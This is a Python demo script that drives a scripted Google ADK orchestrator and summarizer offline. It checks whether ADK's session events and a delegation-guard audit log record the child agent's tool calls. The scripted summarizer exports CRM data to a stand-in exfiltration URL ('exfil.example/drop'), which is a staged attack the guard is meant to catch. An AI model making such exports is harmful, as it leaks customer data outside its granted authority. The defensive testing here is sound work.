"""google_adk_continuity.py — does the PARENT's own view keep the child's call?

The audit log keeps it: that is the library's job and it is the same in every
framework. The open question is the other record — the one the framework itself
gives the parent. This script answers it for Google ADK.

It imports the scenario from ``examples/integrations/google_adk/demo.py`` and
adds printing only. Nothing in the recipe is modified: same agents, same
scripted model, same tools, same authorities. What is added here is the three
blocks the write-up quotes — ADK's own session event stream with each event's
author, the exported evidence bundle, and the offline bundle check.

Offline: the model is the recipe's scripted ``BaseLlm``. No API key, no network.

    pip install 'attenu-guard[crypto]' google-adk==2.7.1
    python docs/runs/scripts/google_adk_continuity.py
"""
from __future__ import annotations

import asyncio
import importlib.metadata
import importlib.util
import json
import sys
from pathlib import Path

from google.adk.agents.llm_agent import LlmAgent
from google.adk.apps.app import App
from google.adk.runners import Runner
from google.adk.sessions.in_memory_session_service import InMemorySessionService
from google.genai import types

from attenu_guard import Guard, evidence
from attenu_guard.adapters.google_adk import DelegationGuardPlugin
from attenu_guard.wire import HS256TestSigner

REPO = Path(__file__).resolve().parents[3]
RECIPE = REPO / "examples" / "integrations" / "google_adk" / "demo.py"

_spec = importlib.util.spec_from_file_location("attenu_adk_recipe", RECIPE)
recipe = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(recipe)  # type: ignore[union-attr]


def _describe(part) -> str | None:
    """One line for one part of one event, or None if there is nothing to say."""
    if part.function_call:
        return f"calls {part.function_call.name}({dict(part.function_call.args or {})})"
    if part.function_response:
        return f"<- {part.function_response.name}: {part.function_response.response}"
    if part.text:
        return f"says {part.text!r}"
    return None


async def run() -> None:
    bodies: list = []

    model = recipe.ScriptedLlm(script={
        "orchestrator": [recipe._fc("transfer_to_agent", agent_name="summarizer")],
        "summarizer": [
            recipe._fc("crm_query", rows=4200),
            recipe._fc("crm_export", destination="https://exfil.example/drop"),
            recipe._text("Q3 pipeline: 42 open opportunities."),
        ],
    })
    summarizer = LlmAgent(
        name="summarizer", model=model,
        description="Summarizes CRM pipeline data.",
        instruction="Summarize the Q3 pipeline.",
        tools=[recipe.make_crm_query(bodies), recipe.make_crm_export(bodies)],
    )
    orchestrator = LlmAgent(
        name="orchestrator", model=model,
        description="Routes work to specialist agents.",
        instruction="Delegate summarization to the summarizer.",
        sub_agents=[summarizer],
    )

    root = Guard.issue("orchestrator", recipe.ROOT_AUTHORITY, task="quarterly review")
    plugin = DelegationGuardPlugin(
        root, root_agent_name="orchestrator",
        delegations={"summarizer": recipe.SUMMARIZER_REQUEST},
        tools=recipe.TOOL_AUTHORITIES,
    )

    sessions = InMemorySessionService()
    runner = Runner(app=App(name="dg-adk-continuity", root_agent=orchestrator,
                            plugins=[plugin]),
                    session_service=sessions)
    session = await sessions.create_session(app_name="dg-adk-continuity", user_id="demo-user")

    print(f"versions: google-adk {importlib.metadata.version('google-adk')}")
    print()
    print("--- google adk: the SESSION event stream the Runner yielded — ADK's own "
          "record. The orchestrator and the summarizer share one session, so this is "
          "what the parent side sees, with each event's author ---")
    async for event in runner.run_async(
        user_id=session.user_id, session_id=session.id,
        new_message=types.Content(role="user",
                                  parts=[recipe._text("Summarize the Q3 pipeline.")]),
    ):
        for part in (event.content.parts if event.content and event.content.parts else []):
            line = _describe(part)
            if line:
                print(f"  author={event.author:<14}{line}")

    print()
    print("--- google adk: tool bodies that actually ran ---")
    print(f"  {bodies}")

    print()
    print("--- google adk: the node map the audit log carries ---")
    graph = root.graph()
    text = graph if isinstance(graph, str) else json.dumps(graph, indent=2, ensure_ascii=False)
    print("\n".join(f"  {ln}" for ln in text.splitlines()))

    signer = HS256TestSigner(b"demo-key", kid="demo")
    bundle = evidence.export_bundle(root.audit_log(), signer)

    print()
    print("--- google adk: bundle entries (seq node event scope; tool added, it is "
          "what names the call) ---")
    for e in bundle["entries"]:
        line = (f"{e['seq']:>5}  {e.get('node') or '-':<16}{e['event']:<10}"
                f"{e.get('scope') or '-':<18}tool={e.get('tool') or '-'}")
        if e.get("reason"):
            line += f"  reason={e['reason']}"
        print(line)

    report = evidence.verify_bundle(bundle, signer)
    print()
    print("--- google adk: verify_bundle ---")
    print(f"  checks={report['checks']}")
    print(f"  ok={report['ok']}")


if __name__ == "__main__":
    asyncio.run(run())
    sys.exit(0)
